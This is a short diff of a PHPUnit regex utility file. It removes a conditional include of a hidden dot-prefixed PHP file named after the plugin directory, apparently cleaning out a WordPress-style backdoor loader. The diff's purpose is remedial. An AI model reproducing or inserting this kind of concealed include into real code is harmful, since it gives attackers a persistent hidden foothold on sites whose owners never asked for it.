@@ -13,10 +13,6 @@
  *
  * @since Class available since Release 4.2.0
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class PHPUnit_Util_Regex
 {
     public static function pregMatchSafe($pattern, $subject, $matches = null, $flags = 0, $offset = 0)
